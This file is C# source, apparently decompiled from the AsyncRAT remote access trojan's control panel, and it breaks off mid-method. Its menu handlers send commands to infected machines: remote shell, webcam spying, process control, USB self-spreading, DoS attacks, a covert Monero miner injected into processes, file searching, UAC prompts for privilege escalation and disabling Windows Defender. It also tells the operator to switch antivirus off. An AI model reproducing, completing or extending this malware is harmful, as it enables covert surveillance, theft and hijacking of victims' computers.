using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using cGeoIp;
using Microsoft.VisualBasic;
using Server.Algorithm;
using Server.Connection;
using Server.Forms;
using Server.Handle_Packet;
using Server.Helper;
using Server.MessagePack;
using Server.Properties;

namespace Server
{
	// Token: 0x0200001A RID: 26
	public partial class Form1 : Form
	{
		// Token: 0x060000E0 RID: 224 RVA: 0x0000E348 File Offset: 0x0000C548
		public Form1()
		{
			this.InitializeComponent();
			Form1.SetWindowTheme(this.listView1.Handle, "explorer", null);
			Form1.SetWindowTheme(this.listView5.Handle, "explorer", null);
			base.Opacity = 0.0;
			this.formDOS = new FormDOS
			{
				Name = "DOS",
				Text = "DOS"
			};
			this.listView1.SmallImageList = this.cGeoMain.cImageList;
			this.listView1.LargeImageList = this.cGeoMain.cImageList;
		}

		// Token: 0x060000E1 RID: 225 RVA: 0x0000E404 File Offset: 0x0000C604
		private void CheckFiles()
		{
			try
			{
				if (!File.Exists(Path.Combine(Application.StartupPath, Path.GetFileName(Application.ExecutablePath) + ".config")))
				{
					MessageBox.Show("Missing " + Path.GetFileName(Application.ExecutablePath) + ".config");
					Environment.Exit(0);
				}
				if (!File.Exists(Path.Combine(Application.StartupPath, "Stub\\Stub.exe")))
				{
					MessageBox.Show("Stub not found! unzip files again and make sure your AV is OFF");
				}
				if (!Directory.Exists(Path.Combine(Application.StartupPath, "Stub")))
				{
					Directory.CreateDirectory(Path.Combine(Application.StartupPath, "Stub"));
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message, "AsyncRAT", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
		}

		// Token: 0x060000E2 RID: 226 RVA: 0x0000E4D0 File Offset: 0x0000C6D0
		private Clients[] GetSelectedClients()
		{
			List<Clients> clientsList = new List<Clients>();
			base.Invoke(new MethodInvoker(delegate()
			{
				object lockListviewClients = Settings.LockListviewClients;
				lock (lockListviewClients)
				{
					if (this.listView1.SelectedItems.Count != 0)
					{
						foreach (object obj in this.listView1.SelectedItems)
						{
							ListViewItem listViewItem = (ListViewItem)obj;
							clientsList.Add((Clients)listViewItem.Tag);
						}
					}
				}
			}));
			return clientsList.ToArray();
		}

		// Token: 0x060000E3 RID: 227 RVA: 0x0000E514 File Offset: 0x0000C714
		private Clients[] GetAllClients()
		{
			List<Clients> clientsList = new List<Clients>();
			base.Invoke(new MethodInvoker(delegate()
			{
				object lockListviewClients = Settings.LockListviewClients;
				lock (lockListviewClients)
				{
					if (this.listView1.Items.Count != 0)
					{
						foreach (object obj in this.listView1.Items)
						{
							ListViewItem listViewItem = (ListViewItem)obj;
							clientsList.Add((Clients)listViewItem.Tag);
						}
					}
				}
			}));
			return clientsList.ToArray();
		}

		// Token: 0x060000E4 RID: 228 RVA: 0x0000E558 File Offset: 0x0000C758
		private void Connect()
		{
			//Form1.<Connect>d__8 <Connect>d__;
			//<Connect>d__.<>t__builder = AsyncVoidMethodBuilder.Create();
			//<Connect>d__.<>1__state = -1;
			//<Connect>d__.<>t__builder.Start<Form1.<Connect>d__8>(ref <Connect>d__);
		}

		// Token: 0x060000E5 RID: 229 RVA: 0x0000E588 File Offset: 0x0000C788
		private void Form1_Load(object sender, EventArgs e)
		{
			//Form1.<Form1_Load>d__9 <Form1_Load>d__;
			//<Form1_Load>d__.<>t__builder = AsyncVoidMethodBuilder.Create();
			//<Form1_Load>d__.<>4__this = this;
			//<Form1_Load>d__.<>1__state = -1;
			//<Form1_Load>d__.<>t__builder.Start<Form1.<Form1_Load>d__9>(ref <Form1_Load>d__);
		}

		// Token: 0x060000E6 RID: 230 RVA: 0x000026F1 File Offset: 0x000008F1
		private void Form1_Activated(object sender, EventArgs e)
		{
			if (this.trans)
			{
				base.Opacity = 1.0;
			}
		}

		// Token: 0x060000E7 RID: 231 RVA: 0x0000270A File Offset: 0x0000090A
		private void Form1_Deactivate(object sender, EventArgs e)
		{
			base.Opacity = 0.95;
		}

		// Token: 0x060000E8 RID: 232 RVA: 0x0000271B File Offset: 0x0000091B
		private void Form1_FormClosed(object sender, FormClosedEventArgs e)
		{
			this.notifyIcon1.Dispose();
			Environment.Exit(0);
		}

		// Token: 0x060000E9 RID: 233 RVA: 0x0000E5C0 File Offset: 0x0000C7C0
		private void listView1_KeyDown(object sender, KeyEventArgs e)
		{
			if (this.listView1.Items.Count > 0 && e.Modifiers == Keys.Control && e.KeyCode == Keys.A)
			{
				foreach (object obj in this.listView1.Items)
				{
					((ListViewItem)obj).Selected = true;
				}
			}
		}

		// Token: 0x060000EA RID: 234 RVA: 0x0000E648 File Offset: 0x0000C848
		private void listView1_MouseMove(object sender, MouseEventArgs e)
		{
			if (this.listView1.Items.Count > 1)
			{
				ListViewHitTestInfo listViewHitTestInfo = this.listView1.HitTest(e.Location);
				if (e.Button == MouseButtons.Left && (listViewHitTestInfo.Item != null || listViewHitTestInfo.SubItem != null))
				{
					this.listView1.Items[listViewHitTestInfo.Item.Index].Selected = true;
				}
			}
		}

		// Token: 0x060000EB RID: 235 RVA: 0x0000E6B8 File Offset: 0x0000C8B8
		private void ListView1_ColumnClick(object sender, ColumnClickEventArgs e)
		{
			if (e.Column == this.lvwColumnSorter.SortColumn)
			{
				if (this.lvwColumnSorter.Order == SortOrder.Ascending)
				{
					this.lvwColumnSorter.Order = SortOrder.Descending;
				}
				else
				{
					this.lvwColumnSorter.Order = SortOrder.Ascending;
				}
			}
			else
			{
				this.lvwColumnSorter.SortColumn = e.Column;
				this.lvwColumnSorter.Order = SortOrder.Ascending;
			}
			this.listView1.Sort();
		}

		// Token: 0x060000EC RID: 236 RVA: 0x0000E72C File Offset: 0x0000C92C
		private void ToolStripStatusLabel2_Click(object sender, EventArgs e)
		{
			//if (Settings.Default.Notification)
			//{
			//	Settings.Default.Notification = false;
			//	this.toolStripStatusLabel2.ForeColor = Color.Black;
			//}
			//else
			//{
			//	Settings.Default.Notification = true;
			//	this.toolStripStatusLabel2.ForeColor = Color.Green;
			//}
			//Settings.Default.Save();
		}

		// Token: 0x060000ED RID: 237 RVA: 0x0000E788 File Offset: 0x0000C988
		private void ping_Tick(object sender, EventArgs e)
		{
			if (this.listView1.Items.Count > 0)
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "Ping";
				msgPack.ForcePathObject("Message").AsString = "This is a ping!";
				Clients[] allClients = this.GetAllClients();
				for (int i = 0; i < allClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(new WaitCallback(allClients[i].Send), msgPack.Encode2Bytes());
				}
				GC.Collect();
			}
		}

		// Token: 0x060000EE RID: 238 RVA: 0x0000E80C File Offset: 0x0000CA0C
		private void UpdateUI_Tick(object sender, EventArgs e)
		{
			this.Text = Settings.Version + "     " + DateTime.Now.ToLongTimeString();
			object lockListviewClients = Settings.LockListviewClients;
			lock (lockListviewClients)
			{
				this.toolStripStatusLabel1.Text = string.Format("Online {0}     Selected {1}     Sites {2}     Wallets {3}          Sent {4}     Received {5}          CPU {6}%     RAM {7}%", new object[]
				{
					this.listView1.Items.Count.ToString(),
					this.listView1.SelectedItems.Count.ToString(),
					this.listBox1.Items.Count.ToString(),
					this.listView5.Items.Count.ToString(),
					Methods.BytesToString(Settings.SentValue).ToString(),
					Methods.BytesToString(Settings.ReceivedValue).ToString(),
					(int)this.performanceCounter1.NextValue(),
					(int)this.performanceCounter2.NextValue()
				});
			}
		}

		// Token: 0x060000EF RID: 239 RVA: 0x0000E93C File Offset: 0x0000CB3C
		private void TOMEMORYToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				FormSendFileToMemory formSendFileToMemory = new FormSendFileToMemory();
				formSendFileToMemory.ShowDialog();
				if (formSendFileToMemory.IsOK)
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Packet").AsString = "sendMemory";
					msgPack.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(formSendFileToMemory.toolStripStatusLabel1.Tag.ToString())));
					if (formSendFileToMemory.comboBox1.SelectedIndex == 0)
					{
						msgPack.ForcePathObject("Inject").AsString = "";
					}
					else
					{
						msgPack.ForcePathObject("Inject").AsString = formSendFileToMemory.comboBox2.Text;
					}
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Packet").AsString = "plugin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SendMemory.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					foreach (Clients clients in this.GetSelectedClients())
					{
						clients.LV.ForeColor = Color.Red;
						ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack2.Encode2Bytes());
					}
				}
				formSendFileToMemory.Close();
				formSendFileToMemory.Dispose();
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x060000F0 RID: 240 RVA: 0x0000EAAC File Offset: 0x0000CCAC
		private void TODISKToolStripMenuItem_Click(object sender, EventArgs e)
		{
			//Form1.<TODISKToolStripMenuItem_Click>d__20 <TODISKToolStripMenuItem_Click>d__;
			//<TODISKToolStripMenuItem_Click>d__.<>t__builder = AsyncVoidMethodBuilder.Create();
			//<TODISKToolStripMenuItem_Click>d__.<>4__this = this;
			//<TODISKToolStripMenuItem_Click>d__.<>1__state = -1;
			//<TODISKToolStripMenuItem_Click>d__.<>t__builder.Start<Form1.<TODISKToolStripMenuItem_Click>d__20>(ref <TODISKToolStripMenuItem_Click>d__);
		}

		// Token: 0x060000F1 RID: 241 RVA: 0x00002287 File Offset: 0x00000487
		private void RemoteDesktopToolStripMenuItem1_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x060000F2 RID: 242 RVA: 0x00002287 File Offset: 0x00000487
		private void KeyloggerToolStripMenuItem1_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x060000F3 RID: 243 RVA: 0x00002287 File Offset: 0x00000487
		private void FileManagerToolStripMenuItem1_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x060000F4 RID: 244 RVA: 0x0000EAE4 File Offset: 0x0000CCE4
		private void ProcessManagerToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "plugin";
				msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\ProcessManager.dll");
				foreach (Clients clients in this.GetSelectedClients())
				{
					if ((FormProcessManager)Application.OpenForms["processManager:" + clients.ID] == null)
					{
						new FormProcessManager
						{
							Name = "processManager:" + clients.ID,
							Text = "processManager:" + clients.ID,
							F = this,
							ParentClient = clients
						}.Show();
						ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x060000F5 RID: 245 RVA: 0x0000EBE4 File Offset: 0x0000CDE4
		private void RunToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				string text = Interaction.InputBox("SEND A NOTIFICATION WHEN CLIENT OPEN A SPECIFIC WINDOW", "TITLE", "YouTube, Photoshop, Steam", -1, -1);
				if (!string.IsNullOrEmpty(text))
				{
					object lockReportWindowClients = Settings.LockReportWindowClients;
					lock (lockReportWindowClients)
					{
						Settings.ReportWindowClients.Clear();
						Settings.ReportWindowClients = new List<Clients>();
					}
					Settings.ReportWindow = true;
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Packet").AsString = "reportWindow";
					msgPack.ForcePathObject("Option").AsString = "run";
					msgPack.ForcePathObject("Title").AsString = text;
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Packet").AsString = "plugin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					Clients[] selectedClients = this.GetSelectedClients();
					for (int i = 0; i < selectedClients.Length; i++)
					{
						ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack2.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x060000F6 RID: 246 RVA: 0x0000ED54 File Offset: 0x0000CF54
		private void StopToolStripMenuItem2_Click(object sender, EventArgs e)
		{
			try
			{
				Settings.ReportWindow = false;
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "reportWindow";
				msgPack.ForcePathObject("Option").AsString = "stop";
				object lockReportWindowClients = Settings.LockReportWindowClients;
				lock (lockReportWindowClients)
				{
					foreach (Clients @object in Settings.ReportWindowClients)
					{
						ThreadPool.QueueUserWorkItem(new WaitCallback(@object.Send), msgPack.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x060000F7 RID: 247 RVA: 0x0000EE30 File Offset: 0x0000D030
		private void WebcamToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.listView1.SelectedItems.Count > 0)
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Packet").AsString = "plugin";
					msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\RemoteCamera.dll");
					foreach (Clients clients in this.GetSelectedClients())
					{
						if ((FormWebcam)Application.OpenForms["Webcam:" + clients.ID] == null)
						{
							new FormWebcam
							{
								Name = "Webcam:" + clients.ID,
								F = this,
								Text = "Webcam:" + clients.ID,
								ParentClient = clients,
								FullPath = Path.Combine(Application.StartupPath, "ClientsFolder", clients.ID, "Camera")
							}.Show();
							ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack.Encode2Bytes());
						}
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x060000F8 RID: 248 RVA: 0x0000EF70 File Offset: 0x0000D170
		private void BotsKillerToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "botKiller";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Packet").AsString = "plugin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Miscellaneous.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = this.GetSelectedClients();
				for (int i = 0; i < selectedClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack2.Encode2Bytes());
				}
				new HandleLogs().Addmsg("Sending Botkiller..", Color.Black);
				this.tabControl1.SelectedIndex = 1;
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x060000F9 RID: 249 RVA: 0x0000F054 File Offset: 0x0000D254
		private void USBSpreadToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "limeUSB";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Packet").AsString = "plugin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Miscellaneous.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = this.GetSelectedClients();
				for (int i = 0; i < selectedClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack2.Encode2Bytes());
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x060000FA RID: 250 RVA: 0x0000F118 File Offset: 0x0000D318
		private void SeedTorrentToolStripMenuItem1_Click_1(object sender, EventArgs e)
		{
			using (FormTorrent formTorrent = new FormTorrent())
			{
				formTorrent.ShowDialog();
			}
		}

		// Token: 0x060000FB RID: 251 RVA: 0x0000F150 File Offset: 0x0000D350
		private void RemoteShellToolStripMenuItem1_Click_1(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "shell";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Packet").AsString = "plugin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Miscellaneous.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				foreach (Clients clients in this.GetSelectedClients())
				{
					if ((FormShell)Application.OpenForms["shell:" + clients.ID] == null)
					{
						new FormShell
						{
							Name = "shell:" + clients.ID,
							Text = "shell:" + clients.ID,
							F = this
						}.Show();
						ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack2.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x060000FC RID: 252 RVA: 0x0000F288 File Offset: 0x0000D488
		private void DOSAttackToolStripMenuItem_Click_1(object sender, EventArgs e)
		{
			try
			{
				if (this.listView1.Items.Count > 0)
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Packet").AsString = "dosAdd";
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Packet").AsString = "plugin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Miscellaneous.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					Clients[] selectedClients = this.GetSelectedClients();
					for (int i = 0; i < selectedClients.Length; i++)
					{
						ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack2.Encode2Bytes());
					}
					this.formDOS.Show();
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x060000FD RID: 253 RVA: 0x0000F36C File Offset: 0x0000D56C
		private void ExecuteNETCodeToolStripMenuItem_Click_1(object sender, EventArgs e)
		{
			if (this.listView1.SelectedItems.Count > 0)
			{
				using (FormDotNetEditor formDotNetEditor = new FormDotNetEditor())
				{
					formDotNetEditor.ShowDialog();
				}
			}
		}

		// Token: 0x060000FE RID: 254 RVA: 0x0000F3B8 File Offset: 0x0000D5B8
		private void RunToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.listView1.SelectedItems.Count > 0)
				{
					using (FormMiner formMiner = new FormMiner())
					{
						if (formMiner.ShowDialog() == DialogResult.OK)
						{
							File.Exists("Plugins\\xmrig.bin");
							MsgPack msgPack = new MsgPack();
							msgPack.ForcePathObject("Packet").AsString = "xmr";
							msgPack.ForcePathObject("Command").AsString = "run";
							XmrSettings.Pool = formMiner.txtPool.Text;
							msgPack.ForcePathObject("Pool").AsString = formMiner.txtPool.Text;
							XmrSettings.Wallet = formMiner.txtWallet.Text;
							msgPack.ForcePathObject("Wallet").AsString = formMiner.txtWallet.Text;
							XmrSettings.Pass = formMiner.txtPass.Text;
							msgPack.ForcePathObject("Pass").AsString = formMiner.txtPool.Text;
							XmrSettings.InjectTo = formMiner.comboInjection.Text;
							msgPack.ForcePathObject("InjectTo").AsString = formMiner.comboInjection.Text;
							XmrSettings.Hash = GetHash.GetChecksum("Plugins\\xmrig.bin");
							msgPack.ForcePathObject("Hash").AsString = XmrSettings.Hash;
							MsgPack msgPack2 = new MsgPack();
							msgPack2.ForcePathObject("Packet").AsString = "plugin";
							msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SendFile.dll");
							msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
							foreach (Clients clients in this.GetSelectedClients())
							{
								clients.LV.ForeColor = Color.Red;
								ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack2.Encode2Bytes());
							}
						}
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x060000FF RID: 255 RVA: 0x0000F5D8 File Offset: 0x0000D7D8
		private void KillToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.listView1.SelectedItems.Count > 0)
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Packet").AsString = "xmr";
					msgPack.ForcePathObject("Command").AsString = "stop";
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Packet").AsString = "plugin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SendFile.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					foreach (Clients clients in this.GetSelectedClients())
					{
						clients.LV.ForeColor = Color.Red;
						ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack2.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000100 RID: 256 RVA: 0x0000F6D4 File Offset: 0x0000D8D4
		private void filesSearcherToolStripMenuItem_Click(object sender, EventArgs e)
		{
			using (FormFileSearcher formFileSearcher = new FormFileSearcher())
			{
				if (formFileSearcher.ShowDialog() == DialogResult.OK && this.listView1.SelectedItems.Count > 0)
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Packet").AsString = "fileSearcher";
					msgPack.ForcePathObject("SizeLimit").AsInteger = (long)formFileSearcher.numericUpDown1.Value * 1000L * 1000L;
					msgPack.ForcePathObject("Extensions").AsString = formFileSearcher.txtExtnsions.Text;
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Packet").AsString = "plugin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\FileSearcher.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					foreach (Clients clients in this.GetSelectedClients())
					{
						clients.LV.ForeColor = Color.Red;
						ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack2.Encode2Bytes());
					}
				}
			}
		}

		// Token: 0x06000101 RID: 257 RVA: 0x0000F82C File Offset: 0x0000DA2C
		private void VisitWebsiteToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				string text = Interaction.InputBox("VISIT WEBSITE", "URL", "https://www.google.com", -1, -1);
				if (!string.IsNullOrEmpty(text))
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Packet").AsString = "visitURL";
					msgPack.ForcePathObject("URL").AsString = text;
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Packet").AsString = "plugin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Extra.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					Clients[] selectedClients = this.GetSelectedClients();
					for (int i = 0; i < selectedClients.Length; i++)
					{
						ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack2.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000102 RID: 258 RVA: 0x0000F928 File Offset: 0x0000DB28
		private void SendMessageBoxToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				string text = Interaction.InputBox("Message", "Message", "Hello World!", -1, -1);
				if (!string.IsNullOrEmpty(text))
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Packet").AsString = "sendMessage";
					msgPack.ForcePathObject("Message").AsString = text;
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Packet").AsString = "plugin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Extra.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					Clients[] selectedClients = this.GetSelectedClients();
					for (int i = 0; i < selectedClients.Length; i++)
					{
						ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack2.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000103 RID: 259 RVA: 0x0000FA24 File Offset: 0x0000DC24
		private void ChatToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				foreach (Clients clients in this.GetSelectedClients())
				{
					if ((FormChat)Application.OpenForms["chat:" + clients.ID] == null)
					{
						new FormChat
						{
							Name = "chat:" + clients.ID,
							Text = "chat:" + clients.ID,
							F = this,
							ParentClient = clients
						}.Show();
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000104 RID: 260 RVA: 0x0000FAD0 File Offset: 0x0000DCD0
		private void GetAdminPrivilegesToolStripMenuItem_Click_1(object sender, EventArgs e)
		{
			if (this.listView1.SelectedItems.Count > 0 && MessageBox.Show(this, "Popup UAC prompt? ", "AsyncRAT | UAC", MessageBoxButtons.YesNo, MessageBoxIcon.Asterisk) == DialogResult.Yes)
			{
				try
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Packet").AsString = "uac";
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Packet").AsString = "plugin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					foreach (Clients clients in this.GetSelectedClients())
					{
						if (clients.LV.SubItems[this.lv_admin.Index].Text != "Administrator")
						{
							ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack2.Encode2Bytes());
						}
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x06000105 RID: 261 RVA: 0x0000FBF4 File Offset: 0x0000DDF4
		private void DisableWindowsDefenderToolStripMenuItem_Click_1(object sender, EventArgs e)
		{
			if (this.listView1.SelectedItems.Count > 0 && MessageBox.Show(this, "Will only execute on clients with administrator privileges!", "AsyncRAT | Disbale Defender", MessageBoxButtons.YesNo, MessageBoxIcon.Asterisk) == DialogResult.Yes)
			{
				try
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Packet").AsString = "disableDefedner";
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Packet").AsString = "plugin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Extra.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					foreach (Clients clients in this.GetSelectedClients())
					{
						if (clients.LV.SubItems[this.lv_admin.Index].Text == "Admin")
						{
							ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack2.Encode2Bytes());
						}
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x06000106 RID: 262 RVA: 0x0000FD18 File Offset: 0x0000DF18
		private void RunToolStripMenuItem2_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.listView1.SelectedItems.Count > 0)
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Packet").AsString = "blankscreen+";
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Packet").AsString = "plugin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Extra.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					Clients[] selectedClients = this.GetSelectedClients();
					for (int i = 0; i < selectedClients.Length; i++)
					{
						ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack2.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000107 RID: 263 RVA: 0x0000FDF0 File Offset: 0x0000DFF0
		private void StopToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.listView1.SelectedItems.Count > 0)
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Packet").AsString = "blankscreen-";
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Packet").AsString = "plugin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Extra.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					Clients[] selectedClients = this.GetSelectedClients();
					for (int i = 0; i < selectedClients.Length; i++)
					{
						ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack2.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000108 RID: 264 RVA: 0x0000FEC8 File Offset: 0x0000E0C8
		private void setWallpaperToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.listView1.SelectedItems.Count > 0)
				{
					using (OpenFileDialog openFileDialog = new OpenFileDialog())
					{
						openFileDialog.Filter = "All Graphics Types|*.bmp;*.jpg;*.jpeg;*.png";
						if (openFileDialog.ShowDialog() == DialogResult.OK)
						{
							MsgPack msgPack = new MsgPack();
							msgPack.ForcePathObject("Packet").AsString = "wallpaper";
							msgPack.ForcePathObject("Image").SetAsBytes(File.ReadAllBytes(openFileDialog.FileName));
							msgPack.ForcePathObject("Exe").AsString = Path.GetExtension(openFileDialog.FileName);
							MsgPack msgPack2 = new MsgPack();
							msgPack2.ForcePathObject("Packet").AsString = "plugin";
							msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Extra.dll");
